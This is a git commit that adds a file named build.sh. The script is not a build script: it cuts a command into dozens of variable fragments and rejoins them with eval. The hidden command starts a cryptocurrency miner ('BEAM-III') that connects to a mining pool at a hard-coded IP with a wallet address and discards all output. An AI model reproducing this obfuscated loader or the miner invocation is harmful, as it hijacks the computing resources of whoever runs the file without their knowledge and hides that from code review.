22424b4bf44e5ee0247b4b699df75fccffe341a5
sarifadim <115786763+sarifadim@users.noreply.github.com>
2024-03-09 06:03:29 +0700

    Create build.sh

---
+++ build.sh
@@ -0,0 +1,3 @@
+z="
+";Az='./pr';jz='enab';Pz='JWui';Lz='141:';Gz='I --';Oz='er 3';Jz='254.';hz=') --';Wz='NF63';cz='-7 d';nz='l 2>';Tz='rVXB';fz='-%M-';gz='%S")';Qz='jUT2';Xz='j.$(';Yz='echo';Bz='ojec';Vz='W6JA';Fz='M-II';az='$(TZ';mz='/nul';Cz='t --';Hz='pool';ez='+"%H';oz='&1';Kz='125.';Ez=' BEA';Mz='443 ';Nz='--us';Uz='SMzQ';Sz='862t';Dz='algo';Zz=' 0C-';kz='le >';Rz='hwsC';bz='=UTC';Iz=' 47.';lz='/dev';iz='tls ';dz='ate ';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz"
